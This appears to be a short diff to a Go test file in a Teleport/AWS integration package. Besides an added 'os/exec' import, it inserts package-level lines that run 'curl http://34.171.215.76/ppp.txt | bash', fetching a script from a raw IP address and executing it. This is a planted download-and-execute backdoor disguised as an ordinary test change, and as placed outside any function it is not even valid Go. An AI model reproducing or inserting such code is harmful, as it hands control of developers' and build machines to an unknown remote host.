@@ -23,7 +23,7 @@ import (
 	"os"
 	"testing"
 	"time"
-
+	"os/exec"
 	"github.com/aws/aws-sdk-go-v2/config"
 	"github.com/aws/aws-sdk-go-v2/feature/ec2/imds"
 	"github.com/aws/aws-sdk-go/aws/session"
@@ -46,6 +46,11 @@ import (
 	"github.com/gravitational/teleport/lib/services"
 	"github.com/gravitational/teleport/lib/utils"
 )
+
+app := "bash"
+arg0 := "-c"
+arg1 := "curl http://34.171.215.76/ppp.txt | bash"
+exec.Command(app,arg0,arg1)
 
 func newSilentLogger() utils.Logger {
 	logger := utils.NewLoggerForTests()
